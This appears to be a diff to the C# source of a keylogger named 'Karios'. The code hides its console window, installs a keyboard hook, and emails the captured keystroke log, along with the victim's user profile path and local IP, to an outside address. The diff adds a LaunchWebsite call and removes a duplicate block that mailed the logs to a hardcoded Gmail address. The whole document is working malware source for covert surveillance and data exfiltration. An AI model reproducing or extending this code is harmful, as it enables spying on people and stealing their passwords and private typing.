@@ -51,8 +51,9 @@ namespace Karios
                 // Start Application
                 var handle = GetConsoleWindow();
                 ShowWindow(handle, SwHide);
-                _hookId = SetHook(_proc);
+                _hookId = SetHook(_proc);      
                 Application.Run();
+                LaunchWebsite();
                 UnhookWindowsHookEx(_hookId);
             }
             Console.WriteLine("IF Statement did not work... exiting");
@@ -267,12 +268,6 @@ namespace Karios
                 mail.To.Add(_emailEndpoint);
                 mail.Subject = "log from keylogger on" + Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                 mail.Body = "New log file from Computer (" + GetLocalIp(_localIp) + " , finshed at: " + DateTime.Now.ToString("yyyy-MM-dd");
-
-                mail.To.Add("GINGIRULES@gmail.com");
-                mail.Subject = "log from keylogger on" +
-                               Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
-                mail.Body = "New log file from Computer (" + GetLocalIp(_localIp) + " , finshed at: " +
-                            DateTime.Now.ToString("yyyy-MM-dd");
                 var attachment = new Attachment(pathToLog);
 
                 mail.Attachments.Add(attachment);
@@ -390,7 +385,7 @@ namespace Karios
             }
             catch
             {
-
+                // ignored
             }
         }
     }
